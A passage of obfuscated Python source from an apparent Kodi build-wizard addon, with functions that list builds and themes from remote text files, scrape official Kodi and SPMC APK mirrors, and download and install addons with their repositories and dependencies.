		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2052
	setView ('files','viewType')#line:2053
def viewBuild (O0OO0O0OO0O0000OO ):#line:2055
	O0000OOOOO00000O0 =wiz .workingURL (SPEEDFILE )#line:2056
	if not O0000OOOOO00000O0 ==True :#line:2057
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2058
		addFile ('%s'%O0000OOOOO00000O0 ,'',themeit =THEME3 )#line:2059
		return #line:2060
	if wiz .checkBuild (O0OO0O0OO0O0000OO ,'version')==False :#line:2061
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2062
		addFile ('%s was not found in the builds list.'%O0OO0O0OO0O0000OO ,'',themeit =THEME3 )#line:2063
		return #line:2064
	OO000O0O0OOO0OO00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2065
	OOOOO0OOO0OOO0OO0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OO0O0OO0O0000OO ).findall (OO000O0O0OOO0OO00 )#line:2066
	for OO0O0OOO0O00O0O0O ,O00O0O0O0OO00O0OO ,O0000OO00O0000000 ,OOOO00O00OOO0O0OO ,O0OOOO0OOOO00000O ,OOO00OOOO0OOOOO0O ,O0O000OOOO0OOO00O ,O00O0OOO00000000O ,O0OOOO00OOOO000OO ,O00OOO0000OOO0000 in OOOOO0OOO0OOO0OO0 :#line:2067
		OOO00OOOO0OOOOO0O =OOO00OOOO0OOOOO0O if wiz .workingURL (OOO00OOOO0OOOOO0O )else ICON #line:2068
		O0O000OOOO0OOO00O =O0O000OOOO0OOO00O if wiz .workingURL (O0O000OOOO0OOO00O )else FANART #line:2069
		O0OOOO0OO0OO00O00 ='%s (v%s)'%(O0OO0O0OO0O0000OO ,OO0O0OOO0O00O0O0O )#line:2070
		if BUILDNAME ==O0OO0O0OO0O0000OO and OO0O0OOO0O00O0O0O >BUILDVERSION :#line:2071
			O0OOOO0OO0OO00O00 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0OOOO0OO0OO00O00 ,BUILDVERSION )#line:2072
		OO0O0O0000OO000O0 =int (float (KODIV ));O0OOO0O00O00000OO =int (float (OOOO00O00OOO0O0OO ))#line:2081
		if not OO0O0O0000OO000O0 ==O0OOO0O00O00000OO :#line:2082
			if OO0O0O0000OO000O0 ==16 and O0OOO0O00O00000OO <=15 :OOOO0O0000OOOO00O =False #line:2083
			else :OOOO0O0000OOOO00O =True #line:2084
		else :OOOO0O0000OOOO00O =False #line:2085
		addFile ('התקנה','install',O0OO0O0OO0O0000OO ,'fresh',description =O00OOO0000OOO0000 ,fanart =O0O000OOOO0OOO00O ,icon =OOO00OOOO0OOOOO0O ,themeit =THEME1 )#line:2089
		if not O0OOOO0OOOO00000O =='http://':#line:2092
			if wiz .workingURL (O0OOOO0OOOO00000O )==True :#line:2093
				addFile (wiz .sep ('THEMES'),'',fanart =O0O000OOOO0OOO00O ,icon =OOO00OOOO0OOOOO0O ,themeit =THEME3 )#line:2094
				OO000O0O0OOO0OO00 =wiz .openURL (O0OOOO0OOOO00000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2095
				OOOOO0OOO0OOO0OO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO000O0O0OOO0OO00 )#line:2096
				for O00OO0O0OO0O0000O ,OO0O0O0000O0OOOOO ,OO00O00OO0000O0OO ,O0O0OO0OO00O000OO ,OO00OO00OOO0O00OO ,O00OOO0000OOO0000 in OOOOO0OOO0OOO0OO0 :#line:2097
					if not SHOWADULT =='true'and OO00OO00OOO0O00OO .lower ()=='yes':continue #line:2098
					OO00O00OO0000O0OO =OO00O00OO0000O0OO if OO00O00OO0000O0OO =='http://'else OOO00OOOO0OOOOO0O #line:2099
					O0O0OO0OO00O000OO =O0O0OO0OO00O000OO if O0O0OO0OO00O000OO =='http://'else O0O000OOOO0OOO00O #line:2100
					addFile (O00OO0O0OO0O0000O if not O00OO0O0OO0O0000O ==BUILDTHEME else "[B]%s (Installed)[/B]"%O00OO0O0OO0O0000O ,'theme',O0OO0O0OO0O0000OO ,O00OO0O0OO0O0000O ,description =O00OOO0000OOO0000 ,fanart =O0O0OO0OO00O000OO ,icon =OO00O00OO0000O0OO ,themeit =THEME3 )#line:2101
	setView ('files','viewType')#line:2102
def viewThirdList (OO0OOOO0000O0O0OO ):#line:2104
	OO0OO0OOOO0O0OOOO =eval ('THIRD%sNAME'%OO0OOOO0000O0O0OO )#line:2105
	O0O00O0O000OOOOOO =eval ('THIRD%sURL'%OO0OOOO0000O0O0OO )#line:2106
	O0O0000O00000OOO0 =wiz .workingURL (O0O00O0O000OOOOOO )#line:2107
	if not O0O0000O00000OOO0 ==True :#line:2108
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2109
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2110
	else :#line:2111
		O0OO0O00000OO0000 ,O0O000O0OO00O0000 =wiz .thirdParty (O0O00O0O000OOOOOO )#line:2112
		addFile ("[B]%s[/B]"%OO0OO0OOOO0O0OOOO ,'',themeit =THEME3 )#line:2113
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2114
		if O0OO0O00000OO0000 :#line:2115
			for OO0OO0OOOO0O0OOOO ,OO0OOO0O00O0O0OO0 ,O0O00O0O000OOOOOO ,O0O0OO000O000000O ,OO0O0O0O0OOOO00O0 ,O00O0OO0O0O00O00O ,OOOOOO00OO0O0O000 ,OOOO00O00O000OO00 in O0O000O0OO00O0000 :#line:2116
				if not SHOWADULT =='true'and OOOOOO00OO0O0O000 .lower ()=='yes':continue #line:2117
				addFile ("[%s] %s v%s"%(O0O0OO000O000000O ,OO0OO0OOOO0O0OOOO ,OO0OOO0O00O0O0OO0 ),'installthird',OO0OO0OOOO0O0OOOO ,O0O00O0O000OOOOOO ,icon =OO0O0O0O0OOOO00O0 ,fanart =O00O0OO0O0O00O00O ,description =OOOO00O00O000OO00 ,themeit =THEME2 )#line:2118
		else :#line:2119
			for OO0OO0OOOO0O0OOOO ,O0O00O0O000OOOOOO ,OO0O0O0O0OOOO00O0 ,O00O0OO0O0O00O00O ,OOOO00O00O000OO00 in O0O000O0OO00O0000 :#line:2120
				addFile (OO0OO0OOOO0O0OOOO ,'installthird',OO0OO0OOOO0O0OOOO ,O0O00O0O000OOOOOO ,icon =OO0O0O0O0OOOO00O0 ,fanart =O00O0OO0O0O00O00O ,description =OOOO00O00O000OO00 ,themeit =THEME2 )#line:2121
def editThirdParty (OOO0O0O0OOO000OOO ):#line:2123
	OOO0O0OOO00OO00O0 =eval ('THIRD%sNAME'%OOO0O0O0OOO000OOO )#line:2124
	OO0O0OO00OO00O0O0 =eval ('THIRD%sURL'%OOO0O0O0OOO000OOO )#line:2125
	OOOOO0000OO0OOOO0 =wiz .getKeyboard (OOO0O0OOO00OO00O0 ,'Enter the Name of the Wizard')#line:2126
	O0OOO0O000O00OOO0 =wiz .getKeyboard (OO0O0OO00OO00O0O0 ,'Enter the URL of the Wizard Text')#line:2127
	wiz .setS ('wizard%sname'%OOO0O0O0OOO000OOO ,OOOOO0000OO0OOOO0 )#line:2129
	wiz .setS ('wizard%surl'%OOO0O0O0OOO000OOO ,O0OOO0O000O00OOO0 )#line:2130
def apkScraper (name =""):#line:2132
	if name =='kodi':#line:2133
		OO0OOO0OO0OO0OO0O ='http://mirrors.kodi.tv/releases/android/arm/'#line:2134
		OO0O00OOO00OO00O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2135
		OO0O00000O00OO0OO =wiz .openURL (OO0OOO0OO0OO0OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2136
		OO0OO0O00OO0O000O =wiz .openURL (OO0O00OOO00OO00O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2137
		OO00OO0OOO00OO00O =0 #line:2138
		OOOO000OO000OOO00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0O00000O00OO0OO )#line:2139
		OO000O00O0O00O0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0OO0O00OO0O000O )#line:2140
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2142
		O0OOO0OOO0OO0OO0O =False #line:2143
		for O00O0OO0O00OOOOO0 ,name ,O0OOO0OO00OO00000 ,O0OOOOOOOOOOO0OOO in OOOO000OO000OOO00 :#line:2144
			if O00O0OO0O00OOOOO0 in ['../','old/']:continue #line:2145
			if not O00O0OO0O00OOOOO0 .endswith ('.apk'):continue #line:2146
			if not O00O0OO0O00OOOOO0 .find ('_')==-1 and O0OOO0OOO0OO0OO0O ==True :continue #line:2147
			try :#line:2148
				O00O0OO00OOOO00OO =name .split ('-')#line:2149
				if not O00O0OO0O00OOOOO0 .find ('_')==-1 :#line:2150
					O0OOO0OOO0OO0OO0O =True #line:2151
					O00O0OO00O0O00000 ,OOO000O0OOOO0O0OO =O00O0OO00OOOO00OO [2 ].split ('_')#line:2152
				else :#line:2153
					O00O0OO00O0O00000 =O00O0OO00OOOO00OO [2 ]#line:2154
					OOO000O0OOOO0O0OO =''#line:2155
				OO0OO000O000OO000 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0OO00OOOO00OO [0 ].title (),O00O0OO00OOOO00OO [1 ],OOO000O0OOOO0O0OO .upper (),O00O0OO00O0O00000 ,COLOR2 ,O0OOO0OO00OO00000 .replace (' ',''),COLOR1 ,O0OOOOOOOOOOO0OOO )#line:2156
				OO0OO000000O00O00 =urljoin (OO0OOO0OO0OO0OO0O ,O00O0OO0O00OOOOO0 )#line:2157
				addFile (OO0OO000O000OO000 ,'apkinstall',"%s v%s%s %s"%(O00O0OO00OOOO00OO [0 ].title (),O00O0OO00OOOO00OO [1 ],OOO000O0OOOO0O0OO .upper (),O00O0OO00O0O00000 ),OO0OO000000O00O00 )#line:2158
				OO00OO0OOO00OO00O +=1 #line:2159
			except :#line:2160
				wiz .log ("Error on: %s"%name )#line:2161
		for O00O0OO0O00OOOOO0 ,name ,O0OOO0OO00OO00000 ,O0OOOOOOOOOOO0OOO in OO000O00O0O00O0O0 :#line:2163
			if O00O0OO0O00OOOOO0 in ['../','old/']:continue #line:2164
			if not O00O0OO0O00OOOOO0 .endswith ('.apk'):continue #line:2165
			if not O00O0OO0O00OOOOO0 .find ('_')==-1 :continue #line:2166
			try :#line:2167
				O00O0OO00OOOO00OO =name .split ('-')#line:2168
				OO0OO000O000OO000 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0OO00OOOO00OO [0 ].title (),O00O0OO00OOOO00OO [1 ],O00O0OO00OOOO00OO [2 ],COLOR2 ,O0OOO0OO00OO00000 .replace (' ',''),COLOR1 ,O0OOOOOOOOOOO0OOO )#line:2169
				OO0OO000000O00O00 =urljoin (OO0O00OOO00OO00O0 ,O00O0OO0O00OOOOO0 )#line:2170
				addFile (OO0OO000O000OO000 ,'apkinstall',"%s v%s %s"%(O00O0OO00OOOO00OO [0 ].title (),O00O0OO00OOOO00OO [1 ],O00O0OO00OOOO00OO [2 ]),OO0OO000000O00O00 )#line:2171
				OO00OO0OOO00OO00O +=1 #line:2172
			except :#line:2173
				wiz .log ("Error on: %s"%name )#line:2174
		if OO00OO0OOO00OO00O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2175
	elif name =='spmc':#line:2176
		O0O0OOO0OO000O0OO ='https://github.com/koying/SPMC/releases'#line:2177
		OO0O00000O00OO0OO =wiz .openURL (O0O0OOO0OO000O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2178
		OO00OO0OOO00OO00O =0 #line:2179
		OOOO000OO000OOO00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO0O00000O00OO0OO )#line:2180
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2182
		for name ,OO000O00O000O0OOO in OOOO000OO000OOO00 :#line:2184
			O000OO0O0OO0O000O =''#line:2185
			OO000O00O0O00O0O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO000O00O000O0OOO )#line:2186
			for OOO00OO0O000O0OOO ,OO0OOOO000O00000O ,OO00O000O0O00OO0O in OO000O00O0O00O0O0 :#line:2187
				if OO00O000O0O00OO0O .find ('armeabi')==-1 :continue #line:2188
				if OO00O000O0O00OO0O .find ('launcher')>-1 :continue #line:2189
				O000OO0O0OO0O000O =urljoin ('https://github.com',OOO00OO0O000O0OOO )#line:2190
				break #line:2191
		if OO00OO0OOO00OO00O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2193
def apkMenu (url =None ):#line:2195
	if url ==None :#line:2196
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2199
	if not APKFILE =='http://':#line:2200
		if url ==None :#line:2201
			O0O00O00000OOOO00 =wiz .workingURL (APKFILE )#line:2202
			OOOOOOOOO00OOO00O =uservar .APKFILE #line:2203
		else :#line:2204
			O0O00O00000OOOO00 =wiz .workingURL (url )#line:2205
			OOOOOOOOO00OOO00O =url #line:2206
		if O0O00O00000OOOO00 ==True :#line:2207
			O00000O00OOOO0OO0 =wiz .openURL (OOOOOOOOO00OOO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2208
			O0OOO00OOO0OO000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00000O00OOOO0OO0 )#line:2209
			if len (O0OOO00OOO0OO000O )>0 :#line:2210
				OO00O0O0OOO000O0O =0 #line:2211
				for OOO000OOO00O000OO ,O0OOO0OOO00OOO00O ,url ,OO00OO000OO0O00O0 ,O0OOOO0OOOO0O0000 ,OO00OOO0OOO00OOO0 ,OOOOOO00OOOO0OO0O in O0OOO00OOO0OO000O :#line:2212
					if not SHOWADULT =='true'and OO00OOO0OOO00OOO0 .lower ()=='yes':continue #line:2213
					if O0OOO0OOO00OOO00O .lower ()=='yes':#line:2214
						OO00O0O0OOO000O0O +=1 #line:2215
						addDir ("[B]%s[/B]"%OOO000OOO00O000OO ,'apk',url ,description =OOOOOO00OOOO0OO0O ,icon =OO00OO000OO0O00O0 ,fanart =O0OOOO0OOOO0O0000 ,themeit =THEME3 )#line:2216
					else :#line:2217
						OO00O0O0OOO000O0O +=1 #line:2218
						addFile (OOO000OOO00O000OO ,'apkinstall',OOO000OOO00O000OO ,url ,description =OOOOOO00OOOO0OO0O ,icon =OO00OO000OO0O00O0 ,fanart =O0OOOO0OOOO0O0000 ,themeit =THEME2 )#line:2219
					if OO00O0O0OOO000O0O <1 :#line:2220
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2221
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2222
		else :#line:2223
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2224
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2225
			addFile ('%s'%O0O00O00000OOOO00 ,'',themeit =THEME3 )#line:2226
		return #line:2227
	else :wiz .log ("[APK Menu] No APK list added.")#line:2228
	setView ('files','viewType')#line:2229
def addonMenu (url =None ):#line:2231
	if not ADDONFILE =='http://':#line:2232
		if url ==None :#line:2233
			O0OOOOOOO0OOOOO0O =wiz .workingURL (ADDONFILE )#line:2234
			O0OO0O00OOOO0O0OO =uservar .ADDONFILE #line:2235
		else :#line:2236
			O0OOOOOOO0OOOOO0O =wiz .workingURL (url )#line:2237
			O0OO0O00OOOO0O0OO =url #line:2238
		if O0OOOOOOO0OOOOO0O ==True :#line:2239
			OOO0000OO0O0000O0 =wiz .openURL (O0OO0O00OOOO0O0OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2240
			OO0O0000000OOOOO0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0000OO0O0000O0 )#line:2241
			if len (OO0O0000000OOOOO0 )>0 :#line:2242
				OO000OOOO0O0OO0O0 =0 #line:2243
				for O0000O0OO00OOOOOO ,O000OOO000OOO000O ,url ,OO0000OO000OO00O0 ,O00O0OO0O0O0OO0OO ,OO0O0O0OO0O0OO0OO ,O0O0O000OOOO0O000 ,OOOO0O0OOO0O0000O ,O000OOO00OOOO0OOO ,O0OOO00OO0OO0OO00 in OO0O0000000OOOOO0 :#line:2244
					if O000OOO000OOO000O .lower ()=='section':#line:2245
						OO000OOOO0O0OO0O0 +=1 #line:2246
						addDir ("[B]%s[/B]"%O0000O0OO00OOOOOO ,'addons',url ,description =O0OOO00OO0OO0OO00 ,icon =O0O0O000OOOO0O000 ,fanart =OOOO0O0OOO0O0000O ,themeit =THEME3 )#line:2247
					else :#line:2248
						if not SHOWADULT =='true'and O000OOO00OOOO0OOO .lower ()=='yes':continue #line:2249
						try :#line:2250
							O0O0O0O0OOO000000 =xbmcaddon .Addon (id =O000OOO000OOO000O ).getAddonInfo ('path')#line:2251
							if os .path .exists (O0O0O0O0OOO000000 ):#line:2252
								O0000O0OO00OOOOOO ="[COLOR green][Installed][/COLOR] %s"%O0000O0OO00OOOOOO #line:2253
						except :#line:2254
							pass #line:2255
						OO000OOOO0O0OO0O0 +=1 #line:2256
						addFile (O0000O0OO00OOOOOO ,'addoninstall',O000OOO000OOO000O ,O0OO0O00OOOO0O0OO ,description =O0OOO00OO0OO0OO00 ,icon =O0O0O000OOOO0O000 ,fanart =OOOO0O0OOO0O0000O ,themeit =THEME2 )#line:2257
					if OO000OOOO0O0OO0O0 <1 :#line:2258
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2259
			else :#line:2260
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2261
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2262
		else :#line:2263
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2264
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2265
			addFile ('%s'%O0OOOOOOO0OOOOO0O ,'',themeit =THEME3 )#line:2266
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2267
	setView ('files','viewType')#line:2268
def addonInstaller (O000OO00OO00OO0OO ,O0000OO0OO0OO0O0O ):#line:2270
	if not ADDONFILE =='http://':#line:2271
		O0OO0OO00OOO00OO0 =wiz .workingURL (O0000OO0OO0OO0O0O )#line:2272
		if O0OO0OO00OOO00OO0 ==True :#line:2273
			OOOO00OO000O00000 =wiz .openURL (O0000OO0OO0OO0O0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2274
			OO0O0OO0OO0OO0O00 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000OO00OO00OO0OO ).findall (OOOO00OO000O00000 )#line:2275
			if len (OO0O0OO0OO0OO0O00 )>0 :#line:2276
				for OO0O0000O0O000O0O ,O0000OO0OO0OO0O0O ,OO00OOO00O0OO00O0 ,O0O00O000OOO00000 ,O0OOOOOOOOOOO0O00 ,O00O0000OO0O0O000 ,O0OOO00000000OO00 ,O0O0O0O0OO000O0OO ,O0OOO0O0OOOOOO0O0 in OO0O0OO0OO0OO0O00 :#line:2277
					if os .path .exists (os .path .join (ADDONS ,O000OO00OO00OO0OO )):#line:2278
						OO00O0OO0OO0O0O0O =['Launch Addon','Remove Addon']#line:2279
						OO00O00000OOO000O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO00O0OO0OO0O0O0O )#line:2280
						if OO00O00000OOO000O ==0 :#line:2281
							wiz .ebi ('RunAddon(%s)'%O000OO00OO00OO0OO )#line:2282
							xbmc .sleep (1000 )#line:2283
							return True #line:2284
						elif OO00O00000OOO000O ==1 :#line:2285
							wiz .cleanHouse (os .path .join (ADDONS ,O000OO00OO00OO0OO ))#line:2286
							try :wiz .removeFolder (os .path .join (ADDONS ,O000OO00OO00OO0OO ))#line:2287
							except :pass #line:2288
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O000OO00OO00OO0OO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2289
								removeAddonData (O000OO00OO00OO0OO )#line:2290
							wiz .refresh ()#line:2291
							return True #line:2292
						else :#line:2293
							return False #line:2294
					O0O0O00O0O0OO0O00 =os .path .join (ADDONS ,OO00OOO00O0OO00O0 )#line:2295
					if not OO00OOO00O0OO00O0 .lower ()=='none'and not os .path .exists (O0O0O00O0O0OO0O00 ):#line:2296
						wiz .log ("Repository not installed, installing it")#line:2297
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O000OO00OO00OO0OO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO00OOO00O0OO00O0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2298
							OOOO0O0000OO00OO0 =wiz .parseDOM (wiz .openURL (O0O00O000OOO00000 ),'addon',ret ='version',attrs ={'id':OO00OOO00O0OO00O0 })#line:2299
							if len (OOOO0O0000OO00OO0 )>0 :#line:2300
								O00OO0OOOO0OOO0O0 ='%s%s-%s.zip'%(O0OOOOOOOOOOO0O00 ,OO00OOO00O0OO00O0 ,OOOO0O0000OO00OO0 [0 ])#line:2301
								wiz .log (O00OO0OOOO0OOO0O0 )#line:2302
								if KODIV >=17 :wiz .addonDatabase (OO00OOO00O0OO00O0 ,1 )#line:2303
								installAddon (OO00OOO00O0OO00O0 ,O00OO0OOOO0OOO0O0 )#line:2304
								wiz .ebi ('UpdateAddonRepos()')#line:2305
								wiz .log ("Installing Addon from Kodi")#line:2307
								OOOOO0000O000OO0O =installFromKodi (O000OO00OO00OO0OO )#line:2308
								wiz .log ("Install from Kodi: %s"%OOOOO0000O000OO0O )#line:2309
								if OOOOO0000O000OO0O :#line:2310
									wiz .refresh ()#line:2311
									return True #line:2312
							else :#line:2313
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OO00OOO00O0OO00O0 )#line:2314
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O000OO00OO00OO0OO ,OO00OOO00O0OO00O0 ))#line:2315
					elif OO00OOO00O0OO00O0 .lower ()=='none':#line:2316
						wiz .log ("No repository, installing addon")#line:2317
						O000O0OOO00O000OO =O000OO00OO00OO0OO #line:2318
						O0OO0O00OOOOO0OO0 =O0000OO0OO0OO0O0O #line:2319
						installAddon (O000OO00OO00OO0OO ,O0000OO0OO0OO0O0O )#line:2320
						wiz .refresh ()#line:2321
						return True #line:2322
					else :#line:2323
						wiz .log ("Repository installed, installing addon")#line:2324
						OOOOO0000O000OO0O =installFromKodi (O000OO00OO00OO0OO ,False )#line:2325
						if OOOOO0000O000OO0O :#line:2326
							wiz .refresh ()#line:2327
							return True #line:2328
					if os .path .exists (os .path .join (ADDONS ,O000OO00OO00OO0OO )):return True #line:2329
					O00OOO00O0OOO0OO0 =wiz .parseDOM (wiz .openURL (O0O00O000OOO00000 ),'addon',ret ='version',attrs ={'id':O000OO00OO00OO0OO })#line:2330
					if len (O00OOO00O0OOO0OO0 )>0 :#line:2331
						O0000OO0OO0OO0O0O ="%s%s-%s.zip"%(O0000OO0OO0OO0O0O ,O000OO00OO00OO0OO ,O00OOO00O0OOO0OO0 [0 ])#line:2332
						wiz .log (str (O0000OO0OO0OO0O0O ))#line:2333
						if KODIV >=17 :wiz .addonDatabase (O000OO00OO00OO0OO ,1 )#line:2334
						installAddon (O000OO00OO00OO0OO ,O0000OO0OO0OO0O0O )#line:2335
						wiz .refresh ()#line:2336
					else :#line:2337
						wiz .log ("no match");return False #line:2338
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2339
		else :wiz .log ("[Addon Installer] Text File: %s"%O0OO0OO00OOO00OO0 )#line:2340
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2341
def installFromKodi (OOOO0000OOOOO00O0 ,over =True ):#line:2343
	if over ==True :#line:2344
		xbmc .sleep (2000 )#line:2345
	wiz .ebi ('RunPlugin(plugin://%s)'%OOOO0000OOOOO00O0 )#line:2347
	if not wiz .whileWindow ('yesnodialog'):#line:2348
		return False #line:2349
	xbmc .sleep (1000 )#line:2350
	if wiz .whileWindow ('okdialog'):#line:2351
		return False #line:2352
	wiz .whileWindow ('progressdialog')#line:2353
	if os .path .exists (os .path .join (ADDONS ,OOOO0000OOOOO00O0 )):return True #line:2354
	else :return False #line:2355
def installAddon (O0OO0O0000O0OOOO0 ,OO0OO0OO0OO0O0O0O ):#line:2357
	if not wiz .workingURL (OO0OO0OO0OO0O0O0O )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OO0O0000O0OOOO0 ,COLOR2 ));return #line:2358
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2359
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O0000O0OOOO0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2360
	OO00000OO000OO0O0 =OO0OO0OO0OO0O0O0O .split ('/')#line:2361
	O0OO000OO000000OO =os .path .join (PACKAGES ,OO00000OO000OO0O0 [-1 ])#line:2362
	try :os .remove (O0OO000OO000000OO )#line:2363
	except :pass #line:2364
	downloader .download (OO0OO0OO0OO0O0O0O ,O0OO000OO000000OO ,DP )#line:2365
	OOOOO0O00OOO0O0O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O0000O0OOOO0 )#line:2366
	DP .update (0 ,OOOOO0O00OOO0O0O0 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2367
	O00O0OO0OOOO00O0O ,O0O0OOO0OOO00OOO0 ,O0OOO00O00000O00O =extract .all (O0OO000OO000000OO ,ADDONS ,DP ,title =OOOOO0O00OOO0O0O0 )#line:2368
	DP .update (0 ,OOOOO0O00OOO0O0O0 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2369
	installed (O0OO0O0000O0OOOO0 )#line:2370
	installDep (O0OO0O0000O0OOOO0 ,DP )#line:2371
	DP .close ()#line:2372
	wiz .ebi ('UpdateAddonRepos()')#line:2373
	wiz .ebi ('UpdateLocalAddons()')#line:2374
	wiz .refresh ()#line:2375
def installDep (OOOO0O00O00O0O00O ,DP =None ):#line:2377
	OOOOOOO0O00OO000O =os .path .join (ADDONS ,OOOO0O00O00O0O00O ,'addon.xml')#line:2378
	if os .path .exists (OOOOOOO0O00OO000O ):#line:2379
		O00OOOOOO0O0000OO =open (OOOOOOO0O00OO000O ,mode ='r');O0OOO0000O0O0O0OO =O00OOOOOO0O0000OO .read ();O00OOOOOO0O0000OO .close ();#line:2380
		OOOO00OO0OOO000O0 =wiz .parseDOM (O0OOO0000O0O0O0OO ,'import',ret ='addon')#line:2381
		for O0000OOO00OO0OOO0 in OOOO00OO0OOO000O0 :#line:2382
			if not 'xbmc.python'in O0000OOO00OO0OOO0 :#line:2383
				if not DP ==None :#line:2384
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000OOO00OO0OOO0 ))#line:2385
				wiz .createTemp (O0000OOO00OO0OOO0 )#line:2386
def installed (O000O0O0OO0OOO000 ):#line:2413
	O0O0OOOO00O000000 =os .path .join (ADDONS ,O000O0O0OO0OOO000 ,'addon.xml')#line:2414
	if os .path .exists (O0O0OOOO00O000000 ):#line:2415
		try :#line:2416
			O00OOOOO000O00000 =open (O0O0OOOO00O000000 ,mode ='r');OO0OO0OOO000O0OO0 =O00OOOOO000O00000 .read ();O00OOOOO000O00000 .close ()#line:2417
